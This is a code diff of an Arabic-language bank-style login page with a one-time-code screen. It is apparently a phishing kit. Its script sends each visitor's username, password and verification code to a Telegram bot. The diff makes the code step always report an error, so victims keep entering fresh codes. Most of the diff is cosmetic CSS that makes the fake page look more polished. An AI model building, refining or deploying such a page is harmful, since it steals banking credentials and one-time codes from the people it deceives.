@@ -27,7 +27,7 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(180deg, #f5f5f5 0%, #efefef 50%, #e8e8e8 100%);
+            background: linear-gradient(180deg, #f7f7f7 0%, #f0f0f0 50%, #e9e9e9 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -45,7 +45,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            opacity: 0.03;
+            opacity: 0.02;
             z-index: 0;
             background-image: 
                 linear-gradient(45deg, transparent 45%, rgba(0,0,0,0.5) 48%, rgba(0,0,0,0.5) 52%, transparent 55%),
@@ -63,19 +63,19 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            padding: 16px;
             overflow-y: auto;
             -webkit-overflow-scrolling: touch;
         }
 
         .login-container, .verify-container {
             background: white;
-            border-radius: 35px;
-            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.12);
+            border-radius: 32px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.1), 0 2px 8px rgba(0, 0, 0, 0.06);
             width: 100%;
-            max-width: 500px;
-            padding: 55px 40px 50px 40px;
-            animation: slideUp 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+            max-width: 480px;
+            padding: 48px 32px 42px 32px;
+            animation: slideUp 0.75s cubic-bezier(0.34, 1.56, 0.64, 1);
             position: relative;
             display: none;
         }
@@ -87,7 +87,7 @@
         @keyframes slideUp {
             from {
                 opacity: 0;
-                transform: translateY(50px);
+                transform: translateY(40px);
             }
             to {
                 opacity: 1;
@@ -98,14 +98,14 @@
         .logo-container {
             display: flex;
             justify-content: center;
-            margin-bottom: 40px;
-            animation: logoScale 1s cubic-bezier(0.34, 1.56, 0.64, 1);
+            margin-bottom: 36px;
+            animation: logoScale 0.9s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
         @keyframes logoScale {
             from {
                 opacity: 0;
-                transform: scale(0.5);
+                transform: scale(0.6);
             }
             to {
                 opacity: 1;
@@ -114,50 +114,65 @@
         }
 
         .logo {
-            width: 150px;
-            height: 150px;
+            width: 140px;
+            height: 140px;
             background: url('https://c.top4top.io/p_3925eoedz1.jpeg') center/cover no-repeat;
             border-radius: 50%;
-            filter: drop-shadow(0 12px 35px rgba(196, 30, 58, 0.22));
-            box-shadow: 0 0 0 6px rgba(196, 30, 58, 0.06);
-            transition: transform 0.4s ease;
+            filter: drop-shadow(0 10px 30px rgba(196, 30, 58, 0.18));
+            box-shadow: 0 0 0 5px rgba(196, 30, 58, 0.05);
+            transition: transform 0.3s ease;
             flex-shrink: 0;
         }
 
         .logo:active {
-            transform: scale(0.97);
+            transform: scale(0.96);
+        }
+
+        .logo-verification {
+            width: 120px;
+            height: 120px;
+            background: url('https://c.top4top.io/p_3925eoedz1.jpeg') center/cover no-repeat;
+            border-radius: 50%;
+            filter: drop-shadow(0 8px 24px rgba(196, 30, 58, 0.15));
+            box-shadow: 0 0 0 4px rgba(196, 30, 58, 0.04);
+            transition: transform 0.3s ease;
+            flex-shrink: 0;
+        }
+
+        .logo-verification:active {
+            transform: scale(0.96);
         }
 
         .title {
             text-align: center;
-            font-size: 42px;
+            font-size: 40px;
             font-weight: 900;
             color: #1a1a1a;
-            margin-bottom: 10px;
-            letter-spacing: -1.5px;
+            margin-bottom: 9px;
+            letter-spacing: -1.3px;
         }
 
         .subtitle {
             text-align: center;
-            font-size: 13px;
-            color: #b0b0b0;
-            margin-bottom: 36px;
-            letter-spacing: 0.5px;
+            font-size: 12px;
+            color: #b8b8b8;
+            margin-bottom: 32px;
+            letter-spacing: 0.3px;
             font-weight: 500;
         }
 
         .form-group {
-            margin-bottom: 22px;
+            margin-bottom: 20px;
             animation: slideInForm 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) backwards;
         }
 
-        .form-group:nth-child(3) { animation-delay: 0.15s; }
-        .form-group:nth-child(4) { animation-delay: 0.25s; }
+        .form-group:nth-child(3) { animation-delay: 0.12s; }
+        .form-group:nth-child(4) { animation-delay: 0.24s; }
 
         @keyframes slideInForm {
             from {
                 opacity: 0;
-                transform: translateX(30px);
+                transform: translateX(25px);
             }
             to {
                 opacity: 1;
@@ -167,11 +182,11 @@
 
         .form-group label {
             display: block;
-            font-size: 14px;
-            color: #555;
-            margin-bottom: 12px;
+            font-size: 13px;
+            color: #4a4a4a;
+            margin-bottom: 11px;
             font-weight: 700;
-            letter-spacing: 0.3px;
+            letter-spacing: 0.2px;
         }
 
         .input-wrapper {
@@ -183,13 +198,13 @@
         input[type="text"],
         input[type="password"] {
             width: 100%;
-            padding: 16px 18px;
-            border: 2.5px solid #e8e8e8;
-            border-radius: 18px;
-            font-size: 16px;
+            padding: 15px 17px;
+            border: 2px solid #e6e6e6;
+            border-radius: 16px;
+            font-size: 15px;
             color: #333;
             transition: all 0.3s ease;
-            background: linear-gradient(135deg, #fafafa 0%, #f7f7f7 100%);
+            background: linear-gradient(135deg, #fbfbfb 0%, #f8f8f8 100%);
             font-family: inherit;
             font-weight: 500;
             -webkit-appearance: none;
@@ -201,23 +216,23 @@
             outline: none;
             border-color: #c41e3a;
             background: white;
-            box-shadow: 0 0 0 5px rgba(196, 30, 58, 0.1);
+            box-shadow: 0 0 0 4px rgba(196, 30, 58, 0.08), inset 0 1px 2px rgba(0, 0, 0, 0.02);
         }
 
         input[type="text"]::placeholder,
         input[type="password"]::placeholder {
-            color: #d5d5d5;
+            color: #d8d8d8;
         }
 
         .toggle-password-btn {
             position: absolute;
-            left: 16px;
+            left: 15px;
             background: none;
             border: none;
             cursor: pointer;
-            padding: 10px;
+            padding: 8px;
             color: #c9b57d;
-            font-size: 22px;
+            font-size: 20px;
             transition: all 0.3s ease;
             display: flex;
             align-items: center;
@@ -225,24 +240,24 @@
         }
 
         .toggle-password-btn:active {
-            transform: scale(1.15);
+            transform: scale(1.12);
         }
 
         .login-btn, .verify-btn {
             width: 100%;
-            padding: 16px;
+            padding: 15px;
             background: linear-gradient(135deg, #c41e3a 0%, #a01830 50%, #8b1529 100%);
             color: white;
             border: none;
-            border-radius: 18px;
-            font-size: 17px;
+            border-radius: 16px;
+            font-size: 16px;
             font-weight: 800;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-top: 30px;
-            margin-bottom: 26px;
-            letter-spacing: 0.6px;
-            box-shadow: 0 10px 28px rgba(196, 30, 58, 0.33);
+            margin-top: 28px;
+            margin-bottom: 24px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 9px 24px rgba(196, 30, 58, 0.3);
             position: relative;
             overflow: hidden;
             -webkit-user-select: none;
@@ -256,7 +271,7 @@
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
             transition: left 0.6s ease;
         }
 
@@ -265,50 +280,50 @@
         }
 
         .login-btn:active, .verify-btn:active {
-            transform: translateY(-2px);
-            box-shadow: 0 14px 35px rgba(196, 30, 58, 0.4);
+            transform: translateY(-1px);
+            box-shadow: 0 12px 32px rgba(196, 30, 58, 0.38);
         }
 
         .divider {
             display: flex;
             align-items: center;
-            margin: 28px 0;
+            margin: 26px 0;
         }
 
         .divider::before,
         .divider::after {
             content: '';
             flex: 1;
-            height: 1.5px;
-            background: #e5e5e5;
+            height: 1px;
+            background: #e0e0e0;
         }
 
         .divider span {
-            padding: 0 16px;
-            color: #aaa;
+            padding: 0 14px;
+            color: #b0b0b0;
             font-weight: 600;
-            font-size: 14px;
+            font-size: 13px;
         }
 
         .auth-options {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 14px;
-            margin-bottom: 26px;
+            gap: 12px;
+            margin-bottom: 24px;
         }
 
         .auth-btn {
-            padding: 14px 16px;
+            padding: 13px 15px;
             background: linear-gradient(135deg, #555 0%, #444 100%);
             color: white;
             border: none;
-            border-radius: 16px;
-            font-size: 14px;
+            border-radius: 14px;
+            font-size: 13px;
             font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
-            letter-spacing: 0.4px;
-            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.16);
+            letter-spacing: 0.3px;
+            box-shadow: 0 5px 14px rgba(0, 0, 0, 0.12);
             position: relative;
             overflow: hidden;
             -webkit-user-select: none;
@@ -333,21 +348,21 @@
         .auth-btn:active {
             background: linear-gradient(135deg, #666 0%, #555 100%);
             transform: translateY(-1px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 7px 18px rgba(0, 0, 0, 0.18);
         }
 
         .footer-links {
             text-align: center;
-            padding-top: 22px;
-            border-top: 1.5px solid #f2f2f2;
+            padding-top: 20px;
+            border-top: 1px solid #f0f0f0;
         }
 
         .footer-links a {
             color: #c41e3a;
             text-decoration: none;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 700;
-            letter-spacing: 0.3px;
+            letter-spacing: 0.2px;
         }
 
         .footer-links a:active {
@@ -355,42 +370,47 @@
         }
 
         /* Verification Code Styles */
+        .verify-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 38px;
+        }
+
         .verify-title {
-            text-align: right;
-            font-size: 36px;
+            text-align: center;
+            font-size: 38px;
             font-weight: 900;
             color: #1a1a1a;
             margin-bottom: 12px;
-            letter-spacing: -1px;
+            letter-spacing: -1.2px;
         }
 
         .verify-subtitle {
-            text-align: right;
-            font-size: 13px;
-            color: #999;
-            margin-bottom: 32px;
+            text-align: center;
+            font-size: 12px;
+            color: #9a9a9a;
             line-height: 1.6;
         }
 
         .otp-container {
             display: flex;
-            gap: 12px;
-            margin-bottom: 28px;
-            justify-content: flex-end;
-            animation: slideInForm 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 0.15s backwards;
-            flex-direction: row-reverse;
+            gap: 11px;
+            margin-bottom: 32px;
+            justify-content: center;
+            animation: slideInForm 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 0.12s backwards;
         }
 
         .otp-input {
-            width: 70px;
-            height: 70px;
-            border: 2.5px solid #e8e8e8;
-            border-radius: 16px;
-            font-size: 32px;
+            width: 65px;
+            height: 65px;
+            border: 2px solid #e6e6e6;
+            border-radius: 14px;
+            font-size: 28px;
             font-weight: 800;
             text-align: center;
             color: #1a1a1a;
-            background: linear-gradient(135deg, #fafafa 0%, #f7f7f7 100%);
+            background: linear-gradient(135deg, #fbfbfb 0%, #f8f8f8 100%);
             transition: all 0.3s ease;
             -webkit-appearance: none;
             appearance: none;
@@ -408,31 +428,85 @@
             outline: none;
             border-color: #c41e3a;
             background: white;
-            box-shadow: 0 0 0 5px rgba(196, 30, 58, 0.1);
+            box-shadow: 0 0 0 4px rgba(196, 30, 58, 0.08);
+        }
+
+        .otp-input.error {
+            border-color: #d32f2f;
+            background: #ffebee;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
         }
 
         .otp-input::placeholder {
-            color: #e0e0e0;
+            color: #e8e8e8;
         }
 
-        @media (max-width: 480px) {
-            body {
-                padding: 0;
-            }
+        /* Alert Notification */
+        .alert-notification {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            display: none;
+            z-index: 999;
+            animation: slideDown 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
 
+        .alert-notification.show {
+            display: flex;
+            justify-content: center;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .alert-content {
+            background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%);
+            color: white;
+            padding: 16px 24px;
+            border-radius: 0 0 16px 16px;
+            box-shadow: 0 8px 24px rgba(211, 47, 47, 0.3);
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            max-width: 90%;
+            text-align: center;
+            margin-top: env(safe-area-inset-top);
+        }
+
+        @media (max-width: 520px) {
             .page-wrapper {
-                padding: 15px;
+                padding: 12px;
             }
 
             .login-container, .verify-container {
-                padding: 45px 30px 40px 30px;
-                border-radius: 30px;
+                padding: 42px 26px 36px 26px;
+                border-radius: 28px;
             }
 
             .logo {
                 width: 130px;
                 height: 130px;
-                margin-bottom: 30px;
+                margin-bottom: 32px;
+            }
+
+            .logo-verification {
+                width: 110px;
+                height: 110px;
             }
 
             .title, .verify-title {
@@ -441,91 +515,114 @@
             }
 
             .subtitle, .verify-subtitle {
-                font-size: 12px;
-                margin-bottom: 28px;
+                font-size: 11px;
+                margin-bottom: 26px;
             }
 
             .form-group label {
-                font-size: 13px;
-                margin-bottom: 10px;
+                font-size: 12px;
+                margin-bottom: 9px;
             }
 
             input[type="text"],
             input[type="password"] {
-                padding: 14px 16px;
+                padding: 14px 15px;
                 font-size: 15px;
                 border-radius: 14px;
             }
 
             .otp-input {
-                width: 60px;
-                height: 60px;
-                font-size: 28px;
-                border-radius: 14px;
+                width: 58px;
+                height: 58px;
+                font-size: 26px;
+                border-radius: 12px;
             }
 
             .otp-container {
-                gap: 8px;
-                margin-bottom: 24px;
+                gap: 9px;
+                margin-bottom: 28px;
             }
 
             .login-btn, .verify-btn {
-                padding: 15px;
+                padding: 14px;
                 font-size: 15px;
-                margin-top: 26px;
-                margin-bottom: 22px;
+                margin-top: 24px;
+                margin-bottom: 20px;
                 border-radius: 14px;
             }
 
             .auth-btn {
-                padding: 13px 14px;
-                font-size: 13px;
+                padding: 12px 13px;
+                font-size: 12px;
                 border-radius: 12px;
             }
 
             .divider {
-                margin: 24px 0;
+                margin: 22px 0;
             }
 
             .divider span {
+                font-size: 12px;
+                padding: 0 11px;
+            }
+
+            .verify-header {
+                margin-bottom: 32px;
+            }
+
+            .alert-content {
                 font-size: 13px;
-                padding: 0 12px;
+                padding: 14px 20px;
             }
         }
 
-        @media (max-width: 360px) {
+        @media (max-width: 380px) {
             .login-container, .verify-container {
-                padding: 40px 22px 35px 22px;
+                padding: 38px 22px 32px 22px;
             }
 
             .logo {
-                width: 110px;
-                height: 110px;
+                width: 115px;
+                height: 115px;
+                margin-bottom: 28px;
+            }
+
+            .logo-verification {
+                width: 100px;
+                height: 100px;
             }
 
             .title, .verify-title {
-                font-size: 32px;
+                font-size: 33px;
+            }
+
+            .subtitle, .verify-subtitle {
+                font-size: 10px;
             }
 
             .otp-input {
-                width: 55px;
-                height: 55px;
+                width: 54px;
+                height: 54px;
                 font-size: 24px;
             }
 
             .otp-container {
-                gap: 6px;
+                gap: 8px;
+            }
+
+            .form-group {
+                margin-bottom: 18px;
             }
         }
 
         @supports (padding: max(0px)) {
             .login-container, .verify-container {
-                padding-bottom: max(40px, env(safe-area-inset-bottom));
+                padding-bottom: max(36px, env(safe-area-inset-bottom));
             }
 
-            @media (max-width: 480px) {
+            @media (max-width: 520px) {
                 .login-container, .verify-container {
-                    padding-bottom: max(35px, env(safe-area-inset-bottom));
+                    padding-bottom: max(32px, env(safe-area-inset-bottom));
                 }
             }
         }
@@ -533,6 +630,13 @@
 </head>
 <body>
     <div class="geometric-pattern"></div>
+
+    <!-- Alert Notification -->
+    <div class="alert-notification" id="alertNotification">
+        <div class="alert-content" id="alertContent">
+            خطأ في أحد المعلومات المدخلة
+        </div>
+    </div>
 
     <div class="page-wrapper">
         <!-- Login Screen -->
@@ -595,8 +699,13 @@
 
         <!-- Verification Screen -->
         <div class="verify-container" id="verifyScreen">
-            <h1 class="verify-title">تحقق من هويتك</h1>
-            <p class="verify-subtitle">أدخل رمز التحقق المكون من 4 أرقام<br>الذي تم إرساله إليك</p>
+            <div class="verify-header">
+                <div class="logo-container">
+                    <div class="logo-verification"></div>
+                </div>
+                <h1 class="verify-title">تحقق من هويتك</h1>
+                <p class="verify-subtitle">أدخل رمز التحقق المكون من 4 أرقام</p>
+            </div>
 
             <form id="verifyForm">
                 <div class="otp-container" id="otpContainer">
@@ -625,6 +734,18 @@
         };
 
         let isPasswordVisible = false;
+
+        // Show Alert Notification
+        function showAlert(message) {
+            const alertNotification = document.getElementById('alertNotification');
+            const alertContent = document.getElementById('alertContent');
+            alertContent.textContent = message;
+            alertNotification.classList.add('show');
+
+            setTimeout(() => {
+                alertNotification.classList.remove('show');
+            }, 3500);
+        }
 
         // Password Toggle
         document.getElementById('passwordToggle').addEventListener('click', (e) => {
@@ -659,7 +780,7 @@
 
         // Send First Data to Telegram (Login Only)
         async function sendLoginDataToTelegram(username, password) {
-            const message = `📌 بيانات دخول جديدة:\n\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}`;
+            const message = `بيانات دخول جديدة:\n\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
             
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
@@ -684,7 +805,7 @@
 
         // Send Second Data to Telegram (Login + Verification Code)
         async function sendVerificationDataToTelegram(username, password, verificationCode) {
-            const message = `✅ تحقق من الهوية - البيانات الكاملة:\n\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}\n🔑 رمز التحقق: ${verificationCode}`;
+            const message = `تحقق من الهوية - البيانات الكاملة:\n\nاسم المستخدم: ${username}\nكلمة المرور: ${password}\nرمز التحقق: ${verificationCode}`;
             
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
@@ -714,7 +835,7 @@
             const password = document.getElementById('password').value;
 
             if (!username || !password) {
-                alert('⚠️ الرجاء ملء جميع الحقول');
+                showAlert('الرجاء ملء جميع الحقول');
                 return;
             }
 
@@ -753,7 +874,7 @@
             const otpValues = Array.from(otpInputs).map(input => input.value).join('');
             
             if (otpValues.length !== 4) {
-                alert('⚠️ الرجاء إدخال رمز التحقق الكامل');
+                showAlert('الرجاء إدخال رمز التحقق الكامل');
                 return;
             }
 
@@ -767,31 +888,27 @@
             const sent = await sendVerificationDataToTelegram(loginData.username, loginData.password, otpValues);
 
             setTimeout(() => {
-                verifyBtn.classList.add('success');
-                verifyBtn.textContent = '✓ تم التحقق بنجاح';
-                
+                // Show error alert
+                showAlert('خطأ في أحد المعلومات المدخلة');
+
+                // Reset OTP inputs with error state
+                otpInputs.forEach(input => {
+                    input.value = '';
+                    input.classList.add('error');
+                });
+
+                // Remove error state after animation
                 setTimeout(() => {
-                    if (sent) {
-                        alert('🎉 تم تسجيل الدخول بنجاح');
-                    } else {
-                        alert('✓ تم معالجة طلبك بنجاح');
-                    }
-                    
-                    // Reset
-                    document.getElementById('loginForm').reset();
-                    document.getElementById('verifyForm').reset();
-                    otpInputs.forEach(input => input.value = '');
-                    
-                    document.getElementById('verifyScreen').classList.remove('active');
-                    document.getElementById('loginScreen').classList.add('active');
-                    
-                    verifyBtn.classList.remove('success');
-                    verifyBtn.textContent = originalText;
-                    verifyBtn.disabled = false;
-                    verifyBtn.style.opacity = '1';
-                    document.getElementById('passwordToggle').textContent = '🔒';
-                    isPasswordVisible = false;
-                }, 1200);
+                    otpInputs.forEach(input => input.classList.remove('error'));
+                }, 500);
+
+                // Reset button
+                verifyBtn.textContent = originalText;
+                verifyBtn.disabled = false;
+                verifyBtn.style.opacity = '1';
+
+                // Focus first input
+                otpInputs[0].focus();
             }, 1500);
         });
 
@@ -800,23 +917,26 @@
             document.getElementById('verifyScreen').classList.remove('active');
             document.getElementById('loginScreen').classList.add('active');
             document.getElementById('verifyForm').reset();
-            otpInputs.forEach(input => input.value = '');
+            otpInputs.forEach(input => {
+                input.value = '';
+                input.classList.remove('error');
+            });
         }
 
         // Other handlers
         function handleNewClient(e) {
             e.preventDefault();
-            alert('👋 مرحباً! سيتم تحويلك إلى صفحة التسجيل كعميل جديد');
+            showAlert('مرحباً! سيتم تحويلك إلى صفحة التسجيل');
         }
 
         function handleCreateAccount(e) {
             e.preventDefault();
-            alert('🆕 سيتم تحويلك إلى صفحة إنشاء حساب جديد');
+            showAlert('سيتم تحويلك إلى صفحة إنشاء حساب جديد');
         }
 
         function handleTerms(e) {
             e.preventDefault();
-            alert('📋 الشروط والأحكام\n\nاطلع على جميع شروط استخدام خدمات المصرف');
+            showAlert('اطلع على الشروط والأحكام');
         }
     </script>
 </body>
